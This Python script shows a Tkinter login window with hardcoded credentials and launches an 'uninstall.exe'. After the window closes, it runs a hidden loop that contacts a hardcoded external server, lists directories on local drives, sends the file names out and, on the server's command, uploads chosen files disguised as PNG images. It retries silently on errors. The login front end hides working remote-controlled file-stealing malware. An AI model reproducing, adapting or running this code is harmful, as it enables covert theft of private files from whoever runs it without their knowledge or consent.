import requests
from threading import Timer
from tkinter import *
import datetime
import os
import json

def open_app(app_dir):
    os.startfile(app_dir) #os.startfile（）打开外部应该程序，与windows双击相同

root = Tk()
root.title("登录验证")

Label(root,text='帐号 :').grid(row=0,column=0) # 对Label内容进行 表格式 布局
Label(root,text='密码 :').grid(row=1,column=0)

v1=StringVar()    # 设置变量 .
v2=StringVar()

e1 = Entry(root,textvariable=v1)            # 用于储存 输入的内容
e2 = Entry(root,textvariable=v2,show='*')
e1.grid(row=0,column=1,padx=10,pady=5)      # 进行表格式布局 .
e2.grid(row=1,column=1,padx=10,pady=5)
def show():
    # print("帐号 :%s" % e1.get())          # get 变量内容
    # print("密码 :%s" % e2.get())
    if e1.get() == "15210848977" and e2.get() == "xiaoyuqing" :
        root.destroy()
        app_dir = r'.\\uninstall.exe'#指定应用程序目录
        open_app(app_dir)
    else :
        Label(root,text='账号或密码错误!').grid(row=3,column=0)
        # easygui.msgbox('账号或密码错误!', "提示")

def stop():
    root.destroy()

Button(root,text='登录',width=10,command=show).grid(row=4,column=0,sticky=W,padx=10,pady=5)  # 设置 button 指定 宽度 , 并且 关联 函数 , 使用表格式布局 .
Button(root,text='退出',width=10,command=stop).grid(row=4,column=1,sticky=E,padx=10,pady=5)

mainloop()

# baseUrl = "http://localhost:8100"
baseUrl = "http://114.116.250.115:8100"
currentPath = 'f:/'
currentFileList = []
currentFileListIndex = 0
tt = 5
maxUpload = 0

# def checkConect() :
    # url = baseUrl + "/check"
    # res=requests.request("get",url)
    # res.encoding = 'utf-8'
    
    # print (res.text)

    # if res.text == "1":
    #     checkPath()
    # else:
    #     print('TimeNow:%s' % (datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    # t = Timer(2, printHello)
    # t.start()

def checkPath(p = 'f:/') :
    global tt
    global currentPath
    global currentFileList
    url = baseUrl + "/next"
    headers = {'Content-Type': 'application/json'}
    try:
        if os.path.exists(p):
            currentPath = p
        else:
            currentPath = 'f:/'

        # print ("checkpath " + currentPath)
        fileList = os.listdir(currentPath)
        # print (fileList)
        data = '{"data": "' + (','.join(fileList)) + '", "rootPath": "' + (currentPath) + '"}'
        data = data.encode("utf-8")

        # print (data)
        
        res = requests.post(url, data = data, headers = headers)
        res.encoding = "utf-8"
        # print (res.text)
        info = res.text.split(">")
        print ("errorCodeType:" + info[0])
        if info[0] == "c":
            checkPath(info[1])
        elif info[0] == "e":
            checkPath('e:/')
        elif info[0] == "f":
            checkPath('f:/')
        elif info[0] == "d":
            checkPath('d:/')
        elif info[0] == "s":
            # print("save " + info[1])
            upload(info[1])
        # elif info[0] == "a":
        #     currentFileList = os.listdir(currentPath)
        #     currentFileListIndex = 0
        #     all()
        elif info[0] == "+":
            tt = 600
            t = Timer(tt, checkPath)
            t.start()
        elif info[0] == "-":
            tt = 60
            t = Timer(tt, checkPath)
            t.start()
        elif info[0] == ".":
            tt = 10
            t = Timer(tt, checkPath)
            t.start()
        else:
            t = Timer(tt, checkPath)
            t.start()
    except Exception as e:
        # print ('res Error' + e)
        # t = Timer(60 * 10, checkPath)
        t = Timer(tt, checkPath)
        t.start()

def upload(str = "") :
    # print("save " + str)
    if str == "":
        checkPath(currentPath)
    else:
        try:
            url = baseUrl + "/save"
            files = {'img': ('1.png', open(str, 'rb'), 'image/png', {})}
            res=requests.request("POST",url, data=None, files=files)
        except:
            # notice(str+"_upload_failed")
            # print(str+"_upload_failed")
            checkPath(currentPath)
        else:
            checkPath(currentPath)

# def all() : 
#     global maxUpload
#     global currentPath
#     global currentFileList
#     global currentFileListIndex
#     print("all")
#     if maxUpload < 10:
#         path = currentPath + currentFileList[currentFileListIndex]
#         if path
#         upload()



# def notice(str) :
#     url = baseUrl + "/log?msg=" + str
#     res=requests.get(url)

checkPath()